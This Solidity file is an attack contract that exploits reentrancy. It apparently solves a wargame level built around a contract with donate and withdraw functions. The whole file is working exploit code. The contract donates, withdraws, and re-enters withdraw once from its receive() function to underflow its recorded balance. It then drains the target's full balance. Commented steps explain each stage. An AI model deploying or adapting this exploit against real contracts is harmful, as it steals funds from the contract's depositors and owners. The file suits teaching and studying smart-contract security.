// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract MyReentrancyAttack {

    uint256 constant donation = 1;

    bool done = false;
    IReentrance private target;

    function attack(address payable _target) payable external {
        target = IReentrance(_target);
        
        done = false; // set to false again to make attack reusable
        
        // 1. donate something 
        target.donate{value:msg.value}(address(this));

        // 2. initiate withdraw of whole donation
        target.withdraw(msg.value);

        // 5. we come back here after second receive(); withdraw rest of target balance
        target.withdraw(address(target).balance);
    }

    receive() payable external {
        if (!done) {
            done = true;
            // 3. re-enter target contract and withdraw one more wei to underflow balance in mapping
            target.withdraw(1);
        }
        // don't re-enter target more than once
    }
}